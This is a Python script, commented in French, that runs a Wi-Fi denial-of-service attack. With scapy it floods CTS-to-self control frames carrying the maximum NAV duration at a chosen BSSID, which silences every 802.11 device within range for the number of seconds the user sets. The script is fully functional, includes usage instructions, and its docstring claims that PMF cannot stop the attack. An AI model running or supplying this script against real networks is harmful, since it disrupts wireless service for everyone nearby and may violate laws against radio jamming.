#!/usr/bin/env python3
"""CTS-to-self DoS — exploite le Virtual Carrier Sense (NAV).

Usage : sudo python3 cts_dos.py <iface> <target_bssid> <seconds>

Principe :
  - Le NAV (Network Allocation Vector) est un compteur dans CHAQUE trame 802.11.
  - Quand un device reçoit une trame avec NAV > 0, il DOIT défèrer son émission
    pendant ce temps (obligation standard, pas une politique).
  - CTS-to-self frames ont un champ "Duration" qui sert exactement à ça.
  - On envoie des CTS en boucle avec duration = 32767 µs (max) toutes les ms
    → tous les devices restent silencieux indéfiniment.
  - PMF ne peut PAS protéger ça : c'est la base du standard 802.11 MAC,
    PMF protège uniquement le contenu des trames management/data.
"""

import sys
import time
from scapy.all import RadioTap, Dot11, sendp, conf

def main():
    if len(sys.argv) < 4:
        print(f"usage: {sys.argv[0]} <iface> <bssid> <seconds>")
        sys.exit(1)

    iface, bssid, secs = sys.argv[1], sys.argv[2], int(sys.argv[3])
    conf.verb = 0

    # type=1 (control), subtype=12 (CTS)
    # addr1 = RA (receiver) = le BSSID (RTS/CTS doit pointer vers AP)
    # ID = duration NAV en microsecondes (max 32767)
    cts = RadioTap() / Dot11(
        type=1, subtype=12,
        addr1=bssid,
        ID=32767  # NAV = ~33ms
    )

    print(f"[*] CTS-to-self DoS → channel sera gelé pour les devices à portée")
    print(f"[*] iface={iface}  target_bssid={bssid}  duration={secs}s")
    print(f"[*] NAV = 32767 µs par trame, ~1 trame/ms → coverage permanente\n")

    end = time.time() + secs
    sent = 0
    try:
        # On envoie par batch pour la perf : 100 trames d'un coup
        while time.time() < end:
            sendp([cts] * 100, iface=iface, verbose=False)
            sent += 100
            if sent % 1000 == 0:
                remaining = int(end - time.time())
                print(f"  [+] {sent} CTS envoyés — {remaining}s restantes")
    except KeyboardInterrupt:
        print(f"\n[!] interrompu après {sent} CTS")

    print(f"[+] terminé — {sent} CTS-to-self envoyés en {secs}s")


if __name__ == "__main__":
    main()
